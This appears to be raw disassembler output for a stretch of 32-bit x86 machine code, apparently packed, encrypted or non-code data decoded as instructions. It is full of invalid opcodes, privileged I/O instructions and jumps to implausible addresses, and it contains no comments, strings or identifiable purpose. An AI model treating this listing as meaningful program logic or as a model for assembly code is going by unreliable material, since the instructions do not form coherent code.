  40a2b9:	inc    ebx
  40a2ba:	cmp    al,0x90
  40a2bc:	dec    ebp
  40a2bd:	push   ebx
  40a2be:	or     BYTE PTR [ebp-0xf7bcb6],dh
  40a2c4:	cmp    eax,0xaffef6b9
  40a2c9:	jecxz  0x40a2e5
  40a2cb:	xor    BYTE PTR ds:0x6fff0833,ch
  40a2d1:	sbb    al,0x10
  40a2d3:	call   FWORD PTR ds:0x15905814
  40a2d9:	sbb    ecx,DWORD PTR [eax]
  40a2db:	inc    ebp
  40a2dc:	adc    al,BYTE PTR ds:0xb05febf
  40a2e2:	or     BYTE PTR [ebp-0x2],dh
  40a2e5:	adc    ecx,DWORD PTR [edx]
  40a2e7:	(bad)  
  40a2e8:	cli    
  40a2e9:	jmp    0x40a324
  40a2eb:	ret    0xebfe
  40a2ee:	lods   eax,DWORD PTR ds:[esi]
  40a2ef:	mov    dl,dh
  40a2f1:	ins    BYTE PTR es:[edi],dx
  40a2f2:	inc    eax
  40a2f3:	call   0x8d4785dd
  40a2f8:	aas    
  40a2f9:	fdiv   DWORD PTR [ebx+0xfe]
	...
  40a30b:	add    BYTE PTR [eax],al
  40a30d:	add    BYTE PTR [edi-0x4],al
  40a310:	add    eax,0x22d3f675
  40a315:	(bad)  
  40a316:	cli    
  40a317:	jmp    0x40a312
  40a319:	mov    edi,0xe67105
  40a31e:	cli    
  40a31f:	jmp    0x40a35e
  40a321:	inc    ebp
  40a322:	mov    ds:0xfa0002eb,al
  40a327:	stos   BYTE PTR es:[edi],al
  40a328:	shl    bl,0x95
  40a32b:	repnz add al,BYTE PTR [eax]
  40a32e:	and    ah,ch
  40a330:	cwde   
  40a331:	call   DWORD PTR [ebx]
  40a333:	in     al,dx
  40a334:	cwde   
  40a335:	jmp    FWORD PTR [esi+0x28]
  40a338:	adc    BYTE PTR [eax-0x79],dl
  40a33b:	jo     0x40a34d
  40a33d:	imul   DWORD PTR [ebp+0x72]
  40a340:	mov    ah,0xfe
  40a342:	out    dx,eax
  40a343:	add    al,0x61
  40a345:	pop    es
  40a346:	out    0x0,eax
  40a348:	push   ecx
  40a349:	push   ecx
  40a34a:	fadd   DWORD PTR [ecx+ebp*8]
  40a34d:	cli    
  40a34e:	lea    edi,[eax-0x1c]
  40a351:	sbb    al,0x5b
  40a353:	add    al,0xe9
  40a355:	add    edx,edx
  40a357:	mov    ah,0x10
  40a359:	lds    esi,FWORD PTR ds:0x15f3bc02
  40a35f:	fcomp  QWORD PTR [ecx+0x7]
  40a362:	and    eax,0x6f347254
  40a367:	xchg   DWORD PTR [edi+ecx*1],edx
  40a36a:	adc    eax,0x15b1b901
  40a36f:	int3   
  40a370:	jns    0x40a379
	...
  40a382:	add    BYTE PTR [eax],al
  40a384:	add    eax,0x5146b8b
  40a389:	add    esi,edi
  40a38b:	sbb    edx,DWORD PTR [edx*4+0x56006f5]
  40a392:	add    DWORD PTR [ebx],0xffffffe5
  40a395:	mov    edx,0xdd0ed8
  40a39a:	ficom  WORD PTR [eax+0x730ced01]
  40a3a0:	int    0x0
  40a3a2:	pusha  
  40a3a3:	adc    dh,0xf8
  40a3a6:	lds    eax,FWORD PTR [esi]
  40a3a8:	mov    ebp,0xb50eccba
  40a3ad:	add    cl,al
  40a3af:	aas    
  40a3b0:	xchg   ebx,eax
  40a3b1:	add    BYTE PTR [esi+0xa7965fa],ch
  40a3b7:	mov    ah,0x72
  40a3b9:	mov    dl,BYTE PTR [eax-0x69ff6af2]
  40a3bf:	push   eax
  40a3c0:	mov    ds:0x92068df8,al
  40a3c5:	push   es
  40a3c6:	pop    esp
  40a3c7:	push   es
  40a3c8:	jge    0x40a3d6
  40a3ca:	test   eax,0x6cbd8f
  40a3cf:	jmp    0x40a3ca
  40a3d1:	out    dx,eax
  40a3d2:	mov    ebp,0x41413f01
  40a3d7:	jmp    0x57285dd0
  40a3dc:	cld    
  40a3dd:	(bad)  
  40a3de:	(bad)  
  40a3df:	fcom   QWORD PTR [ecx-0x18]
  40a3e2:	xchg   edi,eax
  40a3e3:	xchg   ebp,eax
  40a3e4:	cld    
  40a3e5:	jmp    DWORD PTR [edi-0x15]
	...
  40a3f8:	add    BYTE PTR [eax],al
  40a3fa:	stc    
  40a3fb:	out    dx,eax
  40a3fc:	mov    ebp,0x41416ed1
  40a401:	jmp    0x37285dfa
  40a406:	cld    
  40a407:	(bad)  
  40a408:	(bad)  
  40a409:	pushf  
  40a40a:	and    eax,ebp
  40a40c:	jg     0x40a463
  40a40e:	cld    
  40a40f:	jmp    DWORD PTR [edi-0x17]
  40a412:	stc    
  40a413:	out    dx,eax
  40a414:	mov    ebp,0x41408a81
  40a419:	jmp    0xf7285e12
  40a41e:	(bad)  
  40a41f:	(bad)  
  40a420:	(bad)  
  40a421:	jl     0x40a414
  40a423:	out    0x67,eax
  40a425:	xor    eax,0x7de7fffc
  40a42a:	addr16 add bh,bh
  40a42d:	fiadd  WORD PTR [ebp-0xf]
  40a430:	not    dh
  40a432:	imul   esp
  40a434:	mov    BYTE PTR [esi-0x1],bl
  40a437:	(bad)  
  40a438:	(bad)  
  40a439:	jl     0x40a421
  40a43b:	idiv   esi
  40a43d:	mov    esi,0xb60c79ff
  40a442:	jge    0x40a44b
  40a444:	call   0xff40a0d5
  40a449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a44a:	sub    eax,0xff9ef6f5
  40a44f:	in     al,dx
  40a450:	ins    BYTE PTR es:[edi],dx
  40a451:	idiv   di
  40a454:	(bad)  
  40a455:	and    al,0xf6
  40a457:	in     eax,dx
  40a458:	lock add BYTE PTR [ebp+0x9],dh
  40a45c:	(bad)  
  40a45d:	inc    DWORD PTR [eax]
	...
  40a46f:	add    BYTE PTR [esi+0x7],ch
  40a472:	call   0x49a72e
  40a477:	leave  
  40a478:	xchg   ecx,eax
  40a479:	cld    
  40a47a:	(bad)  
  40a47b:	push   esp
  40a47c:	call   0xb805279d
  40a481:	call   0x875:0xa0169fe
  40a488:	mov    ebx,0xb4ff8a89
  40a48d:	jnp    0x40a4d4
  40a48f:	cld    
  40a490:	dec    ebx
  40a491:	add    eax,DWORD PTR [eax]
  40a493:	out    dx,eax
  40a494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a495:	mov    al,ds:0x3523c93
  40a49a:	push   0xfec217a5
  40a49f:	(bad)  
  40a4a0:	outs   dx,BYTE PTR ds:[esi]
  40a4a1:	sti    
  40a4a2:	out    0x47,al
  40a4a4:	scas   eax,DWORD PTR es:[edi]
  40a4a5:	or     edi,edi
  40a4a7:	push   0x3fccc6
  40a4ac:	hlt    
  40a4ad:	iret   
  40a4ae:	cmp    eax,0xff02a229
  40a4b3:	jne    0x40a490
  40a4b5:	sbb    dl,BYTE PTR [eax+0x6809d4fd]
  40a4bb:	lods   eax,DWORD PTR ds:[esi]
  40a4bc:	pop    ss
  40a4bd:	ret    0x67fe
  40a4c0:	loope  0x40a4c4
  40a4c2:	add    BYTE PTR [eax-0x17f9705c],al
  40a4c8:	xor    eax,0x2bffff06
  40a4cd:	inc    edx
  40a4ce:	cmp    al,0x41
  40a4d0:	mov    ds:0x9a,eax
	...
  40a4e5:	add    BYTE PTR [ebx-0x648a017e],ah
  40a4eb:	sbb    bl,BYTE PTR [ebx-0x2]
  40a4ee:	push   esp
  40a4ef:	or     DWORD PTR [eax+0x1],ebp
  40a4f2:	mov    dh,0xc3
  40a4f4:	(bad)  
  40a4f5:	addr16 cli 
  40a4f7:	jmp    0x8fbaa4fe
  40a4fc:	lea    eax,[edi]
  40a4fe:	xchg   edx,eax
  40a4ff:	xor    eax,0x7f75ff06
  40a504:	mov    ?,ebx
  40a506:	ins    DWORD PTR es:[edi],dx
  40a507:	add    ebx,edi
  40a509:	out    0xcd,eax
  40a50b:	pop    edi
  40a50c:	add    al,0xff
  40a50e:	xor    ebp,DWORD PTR [edx]
  40a510:	(bad)  
  40a511:	jmp    FWORD PTR [esi-0x3800e88e]
  40a517:	out    0x1a,eax
  40a519:	sbb    DWORD PTR [ecx+0x4f],ebp
  40a51c:	add    al,0xb
  40a51e:	cmp    al,al
  40a520:	leave  
  40a521:	addr16 mov al,0x0
  40a524:	ret    0xbdff
  40a527:	inc    ebx
  40a528:	push   ebp
  40a529:	xchg   edx,eax
  40a52a:	and    eax,0x924fb32f
  40a52f:	jmp    0x40a533
  40a531:	out    dx,eax
  40a532:	push   esp
  40a533:	xchg   esp,eax
  40a534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a535:	cmp    al,0xbb
  40a537:	jmp    0x40a4eb
  40a539:	dec    BYTE PTR [edi+0x49751ae3]
  40a53f:	pop    es
  40a540:	add    al,0x58
  40a542:	(bad)  
  40a543:	in     eax,dx
  40a544:	add    ch,bh
  40a546:	lods   al,BYTE PTR ds:[esi]
  40a547:	adc    DWORD PTR [esi+0x3c],0x0
	...
  40a55a:	add    BYTE PTR [eax],al
  40a55c:	cmp    ebp,esp
  40a55e:	mov    dl,0xfe
  40a560:	addr16 hlt 
  40a562:	jmp    0x7fe8:0x2de8960
  40a569:	gs add edi,edi
  40a56c:	mov    bl,0xa9
  40a56e:	or     eax,DWORD PTR [eax]
  40a570:	daa    
  40a571:	jae    0x40a563
  40a573:	cmp    BYTE PTR [esi+0x20006dbf],0xb
  40a57a:	add    esi,DWORD PTR [ebp-0xe]
  40a57d:	ret    
  40a57e:	mov    dl,0x8a
  40a580:	popf   
  40a581:	add    al,0xa6
  40a583:	lea    edi,[esi]
  40a585:	add    DWORD PTR [ebx],edx
  40a587:	push   ds
  40a588:	lea    esi,[edi-0x1f]
  40a58b:	jmp    0x40a5fb
  40a58d:	std    
  40a58e:	lea    eax,[ebx]
  40a590:	adc    BYTE PTR [edx],ah
  40a592:	xchg   BYTE PTR [ecx+0x2],bh
  40a595:	in     eax,dx
  40a596:	jno    0x40a59b
  40a598:	ins    DWORD PTR es:[edi],dx
  40a599:	std    
  40a59a:	add    ah,BYTE PTR [eax]
  40a59c:	gs ja  0x40a580
  40a59f:	jmp    0x40a61b
  40a5a1:	std    
  40a5a2:	add    edx,DWORD PTR gs:[ebp+0x77]
  40a5a6:	pop    ebp
  40a5a7:	add    eax,edi
  40a5a9:	or     al,0x41
  40a5ab:	int    0x70
  40a5ad:	std    
  40a5ae:	dec    ebp
  40a5af:	int    0x3b
  40a5b1:	or     cl,ch
  40a5b3:	pop    eax
  40a5b4:	xor    eax,0x38f6ca99
  40a5ba:	test   BYTE PTR [edx+edi*8+0x4],0xe9
  40a5bf:	add    eax,DWORD PTR [eax]
	...
  40a5d1:	add    dl,bh
  40a5d3:	sub    DWORD PTR [edx+0x3],eax
  40a5d6:	(bad)  
  40a5d7:	or     al,0x11
  40a5d9:	aaa    
  40a5da:	lods   eax,DWORD PTR ds:[esi]
  40a5db:	add    al,0xe9
  40a5dd:	mov    gs,WORD PTR [esi-0x40395f4]
  40a5e3:	jbe    0x40a5bd
  40a5e5:	push   es
  40a5e6:	retf   0x1288
  40a5e9:	push   es
  40a5ea:	push   esp
  40a5eb:	xchg   BYTE PTR [edx-0x1b8db9a1],dh
  40a5f1:	imul   esi,DWORD PTR [ebp-0x2afbbaf9],0xb7ebed72
  40a5fb:	pop    esp
  40a5fc:	jmp    0xf5ef804
  40a601:	inc    ebp
  40a602:	cli    
  40a603:	ins    BYTE PTR es:[edi],dx
  40a604:	jo     0x40a646
  40a606:	cmp    eax,DWORD PTR ds:0xfc8599d1
  40a60c:	push   DWORD PTR [ebp+0x4473c4f4]
  40a612:	stc    
  40a613:	jno    0x40a61d
  40a615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a616:	repnz sbb eax,0x87f6283e
  40a61c:	ret    
  40a61d:	in     eax,dx
  40a61e:	hlt    
  40a61f:	les    esi,FWORD PTR [esp+esi*1-0x7]
  40a623:	adc    DWORD PTR [ecx],ebp
  40a625:	(bad)  
  40a626:	mov    esi,0xb8b5a304
  40a62b:	inc    ebp
  40a62c:	add    BYTE PTR [edx-0x46],ch
  40a62f:	xor    BYTE PTR [edi],bh
  40a631:	sub    dh,dh
  40a633:	add    al,0x75
  40a635:	icebp  
	...
  40a646:	add    BYTE PTR [eax],al
  40a648:	clc    
  40a649:	adc    DWORD PTR ds:0xeb04b71f,ebx
  40a64f:	adc    ah,dl
  40a651:	add    al,0x6a
  40a653:	call   0x674d850
  40a658:	mov    edi,0xead4ff04
  40a65d:	cmp    al,BYTE PTR [ecx-0x17]
  40a660:	jl     0x40a62a
  40a662:	or     esp,edx
  40a664:	cmp    DWORD PTR [eax+0x21],edi
  40a667:	shl    BYTE PTR es:[eax],cl
  40a66a:	aas    
  40a66b:	test   al,0xf9
  40a66d:	sti    
  40a66e:	adc    al,0xdc
  40a670:	mov    ebx,0x356a0045
  40a675:	or     bh,bh
  40a677:	fcomp  QWORD PTR [edx]
  40a679:	cmp    eax,DWORD PTR [ecx-0x17]
  40a67c:	rol    BYTE PTR [eax],0x34
  40a67f:	mov    dh,0x3e
  40a681:	add    eax,0x4f9e900
  40a686:	jmp    0x40a670
  40a688:	ds nop
  40a68a:	ret    0xc142
  40a68d:	lds    eax,FWORD PTR [edi]
  40a68f:	jmp    0xe74df12
  40a694:	cmp    DWORD PTR ds:0x25f70000,eax
  40a69a:	push   DWORD PTR ds:0x4144a7
  40a6a0:	ins    BYTE PTR es:[edi],dx
  40a6a1:	adc    esi,DWORD PTR ds:0x8300d23e
  40a6a7:	les    esp,FWORD PTR [edi+0x1d1504]
	...
  40a6bd:	add    BYTE PTR [ebp-0x6938ffba],ch
  40a6c3:	xor    edi,DWORD PTR [edi]
  40a6c5:	inc    ecx
  40a6c6:	xchg   ebx,eax
  40a6c7:	pop    es
  40a6c8:	add    BYTE PTR [eax],al
  40a6ca:	arpl   ax,ax
  40a6cc:	push   ebx
  40a6cd:	mov    edi,DWORD PTR [edi-0x7f]
  40a6d0:	ret    0xf0
  40a6d3:	mov    al,BYTE PTR [ebx+0x8]
  40a6d6:	pop    eax
  40a6d7:	(bad)  
  40a6d8:	jb     0x40a6e5
  40a6da:	loopne 0x40a757
  40a6dc:	or     al,0x0
  40a6de:	daa    
  40a6df:	add    al,BYTE PTR [eax+0x7725338]
  40a6e5:	sub    edx,DWORD PTR [ebx]
  40a6e7:	pop    edx
  40a6e8:	leave  
  40a6e9:	ret    0x72b
  40a6ec:	cmp    BYTE PTR [eax],0x6d
  40a6ef:	jae    0x40a701
  40a6f1:	sub    DWORD PTR [esi],0x33
  40a6f4:	aas    
  40a6f5:	inc    ecx
  40a6f6:	adc    eax,DWORD PTR [edi]
  40a6f8:	jne    0x40a701
  40a6fa:	sub    bh,al
  40a6fc:	pop    ecx
  40a6fd:	leave  
  40a6fe:	loope  0x40a708
  40a700:	add    BYTE PTR [eax+0x3e74852b],al
  40a706:	cwde   
  40a707:	push   ebx
  40a708:	or     al,0x4a
  40a70a:	pusha  
  40a70b:	jecxz  0x40a70e
  40a70d:	or     edx,DWORD PTR [ecx]
  40a70f:	jb     0x40a717
  40a711:	sub    DWORD PTR [esi+0xa],0x1
  40a715:	jne    0x40a6ee
  40a717:	sub    eax,eax
  40a719:	jmp    0x40a722
  40a71b:	add    al,0x4d
  40a71d:	or     al,0x48
  40a71f:	inc    ebx
  40a720:	or     al,0x5
	...
  40a732:	add    BYTE PTR [eax],al
  40a734:	cli    
  40a735:	jmp    0x40a73d
  40a737:	add    dl,bh
  40a739:	lods   al,BYTE PTR ds:[esi]
  40a73a:	loop   0x40a73d
  40a73c:	dec    edx
  40a73d:	aam    0x1c
  40a73f:	lea    ebp,[ebp+0x4f8b52bb]
  40a745:	in     al,0x44
  40a747:	push   eax
  40a748:	popf   
  40a749:	xor    DWORD PTR [eax],edx
  40a74b:	push   edx
  40a74c:	mov    ds:0x8dfe9ab9,al
  40a751:	inc    esp
  40a752:	pop    ebp
  40a753:	leave  
  40a754:	mov    eax,0xa12b02e4
  40a759:	mov    esi,DWORD PTR [ebp+0xc]
  40a75c:	jne    0x40a757
  40a75e:	or     ch,BYTE PTR [edx-0x6]
  40a761:	adc    eax,0xcd0fff04
  40a766:	inc    eax
  40a767:	inc    ecx
  40a768:	cli    
  40a769:	outs   dx,BYTE PTR ds:[esi]
  40a76a:	(bad)  
  40a76b:	(bad)  
  40a76d:	sub    al,0x77
  40a76f:	and    DWORD PTR gs:[ecx+0x60f669fe],0x46
  40a777:	lock stos BYTE PTR es:[edi],al
  40a779:	inc    ebx
  40a77a:	test   BYTE PTR [ebx+0x6d4335],0x7f
  40a781:	mov    eax,ds:0xb9254ff2
  40a786:	(bad)  
  40a787:	inc    BYTE PTR [edi]
  40a789:	std    
  40a78a:	inc    eax
  40a78b:	inc    ecx
  40a78c:	cli    
  40a78d:	outs   dx,BYTE PTR ds:[esi]
  40a78e:	(bad)  
  40a78f:	or     eax,DWORD PTR [ecx]
  40a791:	sub    al,0x76
  40a793:	xor    esi,DWORD PTR [edi-0x57]
  40a796:	repnz add BYTE PTR [eax],0x0
	...
  40a7aa:	sbb    bh,0x2
  40a7ad:	je     0x40a7c0
  40a7af:	ja     0x40a7f4
  40a7b1:	or     BYTE PTR [edx],bh
  40a7b3:	pushf  
  40a7b4:	jmp    0xc28a:0xfef276b4
  40a7bb:	pop    eax
  40a7bc:	inc    esi
  40a7bd:	lock aad 0x4
  40a7c0:	pop    ecx
  40a7c1:	or     al,0x29
  40a7c3:	cli    
  40a7c4:	pop    eax
  40a7c5:	or     dl,dl
  40a7c7:	frstor [edi+edi*8-0x44]
  40a7cb:	outs   dx,BYTE PTR ds:[esi]
  40a7cc:	jmp    0x1935e661
  40a7d1:	inc    DWORD PTR [esi]
  40a7d3:	and    bh,bh
  40a7d5:	inc    esp
  40a7d6:	cli    
  40a7d7:	test   DWORD PTR [esp+ecx*1+0x79ae0410],ebp
  40a7de:	xchg   esi,eax
  40a7df:	stc    
  40a7e0:	sti    
  40a7e1:	sub    ah,cl
  40a7e3:	inc    ebx
  40a7e4:	jmp    0x624d616b
  40a7e9:	ret    
  40a7ea:	and    ah,cl
  40a7ec:	stos   BYTE PTR es:[edi],al
  40a7ed:	or     al,0xfa
  40a7ef:	dec    edi
  40a7f0:	jb     0x40a7e2
  40a7f2:	ins    BYTE PTR es:[edi],dx
  40a7f3:	outs   dx,DWORD PTR ds:[esi]
  40a7f4:	in     eax,dx
  40a7f5:	(bad)  
  40a7f6:	out    dx,al
  40a7f7:	or     al,0x76
  40a7f9:	sbb    DWORD PTR [esi],ecx
  40a7fb:	cmp    ch,BYTE PTR [eax]
  40a7fd:	add    al,0x79
  40a7ff:	shl    al,0x53
  40a802:	dec    ebp
  40a803:	outs   dx,DWORD PTR ds:[esi]
  40a804:	in     eax,dx
  40a805:	dec    dh
  40a807:	or     al,0x56
  40a809:	sbb    DWORD PTR [edx],edx
  40a80b:	cmp    ch,BYTE PTR [eax+0x3]
	...
  40a81d:	add    BYTE PTR [eax],al
  40a81f:	add    BYTE PTR [ecx-0x40],bh
  40a822:	lock mov al,dh
  40a825:	adc    al,0x70
  40a827:	add    al,dl
  40a829:	retf   
  40a82a:	sub    dl,BYTE PTR [eax]
  40a82c:	cli    
  40a82d:	dec    edi
  40a82e:	(bad)  
  40a82f:	lock js 0x40a7f2
  40a832:	adc    bh,bh
  40a834:	xchg   BYTE PTR [eax],cl
  40a836:	adc    DWORD PTR [ebx],eax
  40a838:	imul   edi,ecx,0x15
  40a83b:	or     edi,DWORD PTR [edx]
  40a83d:	outs   dx,DWORD PTR ds:[esi]
  40a83e:	in     eax,0xcc
  40a840:	mov    ebx,0x66fee915
  40a845:	or     DWORD PTR [ecx],edx
  40a847:	loopne 0x40a7e0
  40a849:	clc    
  40a84a:	push   ebp
  40a84c:	lock les esi,FWORD PTR [ebx-0x1b]
  40a850:	mov    dh,0xf
  40a853:	jmp    0xde551a24
  40a858:	inc    edx
  40a859:	adc    eax,0xf7faace8
  40a85e:	(bad)  
  40a85f:	loop   0x40a81a
  40a861:	jno    0x40a867
  40a863:	mov    al,0xbb
  40a865:	or     BYTE PTR [eax],al
  40a867:	push   ecx
  40a868:	push   es
  40a869:	cmp    BYTE PTR [ecx-0x17],al
  40a86c:	adc    DWORD PTR [eax-0x1301d7c3],esp
  40a872:	mov    edi,DWORD PTR [edi-0x74]
  40a875:	test   DWORD PTR [edx],0x680802a9
  40a87b:	icebp  
  40a87c:	mov    esp,0x37010045
  40a881:	aaa    
  40a882:	inc    ecx
  40a883:	jmp    0x40a888
	...
  40a894:	add    BYTE PTR [eax],al
  40a896:	popa   
  40a897:	jge    0x40a82f
  40a899:	jle    0x40a8ff
  40a89b:	or     eax,eax
  40a89d:	out    0x75,al
  40a89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8a0:	add    cl,ch
  40a8a2:	stc    
  40a8a3:	mov    DWORD PTR [ebp+eiz*2-0x57],eax
  40a8a7:	div    DWORD PTR [ebp+ebp*8+0x44]
  40a8ab:	adc    DWORD PTR [eax],ebx
  40a8ad:	push   ss
  40a8ae:	mov    bh,0x4
  40a8b0:	and    DWORD PTR ds:0xf6c00c01,0xffffff82
  40a8b7:	pop    DWORD PTR [eax]
  40a8b9:	jmp    0x644113b7
  40a8be:	mov    dl,0xfc
  40a8c0:	dec    edi
  40a8c1:	ret    
  40a8c2:	adc    al,0x60
  40a8c4:	test   al,0xe6
  40a8c6:	mov    dh,0x4
  40a8c8:	call   DWORD PTR [ebp+eax*1-0x4336eb09]
  40a8cf:	inc    ebp
  40a8d0:	add    BYTE PTR [edx-0x43],ch
  40a8d3:	adc    ecx,DWORD PTR [ebx]
  40a8d5:	add    BYTE PTR [ebx],ah
  40a8d7:	pop    es
  40a8d8:	test   DWORD PTR [edx-0x2e],ebp
  40a8db:	add    eax,DWORD PTR [eax]
  40a8dd:	call   FWORD PTR [esi-0x4]
  40a8e0:	std    
  40a8e1:	adc    eax,0x4136bf
  40a8e6:	pusha  
  40a8e7:	int    0x2
  40a8e9:	sbb    ebx,0x6c
  40a8ec:	je     0x40a8f3
  40a8ee:	mov    edx,0xa300015c
  40a8f3:	xchg   BYTE PTR [ebx-0xc],al
  40a8f6:	adc    ebp,DWORD PTR [ebx+0x0]
  40a8f9:	inc    DWORD PTR [eax]
	...
  40a90b:	add    dh,ch
  40a90d:	clc    
  40a90e:	out    0x14,al
  40a910:	fs stc 
  40a912:	std    
  40a913:	or     esp,DWORD PTR [ebx+0x9]
  40a916:	test   BYTE PTR [ecx],bh
  40a918:	mov    ds:0xe6830003,al
  40a91d:	cld    
  40a91e:	dec    BYTE PTR [esi]
  40a920:	cvtpi2ps xmm0,QWORD PTR [ecx]
  40a923:	add    BYTE PTR [ebx-0x7d],ah
  40a926:	add    BYTE PTR ss:[edi+edi*2+0x24],ah
  40a92b:	add    DWORD PTR [ebx+0x3],edx
  40a92e:	push   eax
  40a92f:	mov    edi,esi
  40a931:	cld    
  40a932:	inc    eax
  40a933:	push   edx
  40a934:	jnp    0x40a99c
  40a936:	mov    edi,edi
  40a938:	aam    0x5a
  40a93a:	mov    DWORD PTR [ebp-0x55],eax
  40a93d:	stc    
  40a93e:	jae    0x40a934
  40a940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a941:	outs   dx,DWORD PTR ds:[esi]
  40a942:	call   0x89d06499
  40a947:	push   DWORD PTR [ecx+eax*8+0x313f043]
  40a94e:	add    BYTE PTR [eax],al
  40a950:	int3   
  40a951:	aas    
  40a952:	in     al,dx
  40a953:	add    BYTE PTR [ebx],ah
  40a955:	add    eax,DWORD PTR [eax]
  40a957:	adc    DWORD PTR [esi],0x33
  40a95a:	aas    
  40a95b:	inc    ecx
  40a95c:	adc    eax,DWORD PTR [ebx]
  40a95e:	jne    0x40a9b2
  40a960:	cli    
  40a961:	test   DWORD PTR ds:0xeaec3b40,ebx
  40a967:	sub    DWORD PTR [esi-0x14],ecx
  40a96a:	add    dl,BYTE PTR [eax+0x52]
  40a96d:	fld    DWORD PTR [edx+0x41]
	...
  40a980:	add    BYTE PTR [eax],al
  40a982:	cli    
  40a983:	out    dx,al
  40a984:	jne    0x40a96e
  40a986:	loop   0x40a9a0
  40a988:	pop    edi
  40a989:	add    dl,bh
  40a98b:	bnd ret 0xe273
  40a98f:	push   ebx
  40a990:	sub    BYTE PTR [eax+0x3b],al
  40a993:	in     al,dx
  40a994:	jmp    0x2250:0x2ec560d
  40a99b:	or     BYTE PTR [ecx+eax*2-0x6],al
  40a99f:	mov    dh,0x75
  40a9a1:	call   0x9f2638
  40a9a6:	cli    
  40a9a7:	loop   0x40a96b
  40a9a9:	jae    0x40a973
  40a9ab:	adc    esi,DWORD PTR [eax]
  40a9ad:	inc    eax
  40a9ae:	cmp    ebp,esp
  40a9b0:	jmp    0xe250:0x2ec21f1
  40a9b7:	mov    bh,0x42
  40a9b9:	inc    ecx
  40a9ba:	cli    
  40a9bb:	jle    0x40aa32
  40a9bd:	call   0x9efa14
  40a9c2:	cli    
  40a9c3:	sbb    BYTE PTR [edx],0x68
  40a9c6:	cvttps2pi mm0,QWORD PTR [ebx+0x0]
  40a9ca:	bound  eax,QWORD PTR [eax+ebx*2+0x0]
  40a9ce:	cli    
  40a9cf:	mov    ebx,0xacba356a
  40a9d4:	add    bh,bh
  40a9d6:	scas   eax,DWORD PTR es:[edi]
  40a9d7:	inc    ebx
  40a9d8:	jmp    0x40aa53
  40a9da:	iret   
  40a9db:	jmp    0x40a9df
  40a9dd:	or     edi,DWORD PTR [edx]
  40a9df:	mov    cl,0x6c
  40a9e1:	lea    esi,[edi+0x6a5337]
	...
  40a9f7:	add    bl,bh
  40a9f9:	es jbe 0x40a9f4
  40a9fc:	and    al,BYTE PTR ds:0xf604fdb2
  40aa02:	sbb    eax,0x1550676
  40aa07:	inc    esi
  40aa08:	div    ebp
  40aa0a:	or     eax,0x73f5368a
  40aa0f:	inc    esi
  40aa10:	out    dx,al
  40aa11:	push   esp
  40aa12:	xchg   ebx,eax
  40aa13:	add    ebp,ebx
  40aa15:	outs   dx,DWORD PTR ds:[esi]
  40aa16:	icebp  
  40aa17:	jmp    0x6fcc:0xfbedf70a
  40aa1e:	fst    QWORD PTR [edx+edx*8+0x29]
  40aa22:	fdiv   st(3),st
  40aa24:	mov    esp,0x78e82b8b
  40aa29:	ja     0x40a9ec
  40aa2b:	add    al,0x26
  40aa2d:	xor    DWORD PTR [edx+0x79],ebp
  40aa30:	xchg   esi,eax
  40aa31:	add    al,0x35
  40aa33:	sub    dl,BYTE PTR [edx]
  40aa35:	add    eax,0xf557eae9
  40aa3a:	xor    ecx,DWORD PTR [edx+eiz*4]
  40aa3d:	imul   BYTE PTR [esi-0x5]
  40aa40:	test   ch,dh
  40aa42:	adc    ebp,esp
  40aa44:	jl     0x40aab5
  40aa46:	loope  0x40aa33
  40aa48:	into   
  40aa49:	jge    0x40a9d8
  40aa4b:	sti    
  40aa4c:	ins    BYTE PTR es:[edi],dx
  40aa4d:	outs   dx,DWORD PTR ds:[esi]
  40aa4e:	jns    0x40aa4b
  40aa50:	out    dx,al
  40aa51:	or     al,0x91
  40aa53:	dec    esi
  40aa54:	jne    0x40aa4b
  40aa56:	jne    0x40aa53
  40aa58:	into   
  40aa59:	call   0x411bcb
	...
  40aa6e:	add    ch,ch
  40aa70:	and    eax,0x5df54483
  40aa75:	jno    0x40aac1
  40aa77:	in     al,dx
  40aa78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa79:	lea    esi,[esi*8-0x13e18eb3]
  40aa80:	lods   al,BYTE PTR ds:[esi]
  40aa81:	lea    esp,[esi*8-0x13ed8ec3]
  40aa88:	push   esp
  40aa8a:	xchg   esi,esi
  40aa8c:	inc    BYTE PTR [eax+0x68]
  40aa8f:	idiv   esi
  40aa91:	add    DWORD PTR es:[eax-0x4],esi
  40aa95:	push   ds
  40aa96:	jmp    0x40aab0
  40aa98:	aas    
  40aa99:	test   al,0xf9
  40aa9b:	xchg   ebx,eax
  40aa9d:	in     eax,0xe1
  40aa9f:	fwait
  40aaa0:	sti    
  40aaa1:	push   es
  40aaa2:	loope  0x40aa61
  40aaa4:	rcr    ecx,0xf9
  40aaa7:	pop    ecx
  40aaa8:	mov    eax,DWORD PTR ds:0xee005f2d
  40aaae:	dec    edx
  40aaaf:	std    
  40aab0:	out    0x9a,eax
  40aab2:	jb     0x40aaa7
  40aab4:	(bad)  
  40aab5:	jb     0x40aa58
  40aab7:	push   edi
  40aab8:	call   0x45ffb6
  40aabd:	loop   0x40aa78
  40aabf:	js     0x40aadc
  40aac1:	jmp    0x3c79:0xdbeb4cbc
  40aac8:	or     eax,0x3784fb3d
  40aacd:	jecxz  0x40aad9
  40aacf:	or     al,dh
  40aad1:	jmp    0x40aad6
	...
  40aae2:	add    BYTE PTR [eax],al
  40aae4:	stc    
  40aae5:	fild   WORD PTR [ecx]
  40aae7:	xchg   edx,eax
  40aae8:	cli    
  40aae9:	cmp    al,0x3b
  40aaeb:	stos   BYTE PTR es:[edi],al
  40aaec:	in     al,dx
  40aaed:	fimul  WORD PTR [edx-0x3e423356]
  40aaf3:	in     eax,dx
  40aaf4:	stc    
  40aaf5:	pop    ecx
  40aaf6:	mov    ecx,DWORD PTR [ebp+0x1eb3c874]
  40aafc:	push   ecx
  40aafd:	jns    0x40ab0b
  40aaff:	sbb    DWORD PTR [edx+eax*4-0x3b0b9902],0xbda0e474
  40ab0a:	sar    ecx,0xf9
  40ab0d:	repz je 0x40aaed
  40ab10:	and    DWORD PTR [edi-0x1143ff55],eax
  40ab16:	or     eax,eax
  40ab18:	addr16 add eax,0x17e1c95f
  40ab1e:	add    bh,bh
  40ab20:	inc    esi
  40ab21:	add    al,0xff
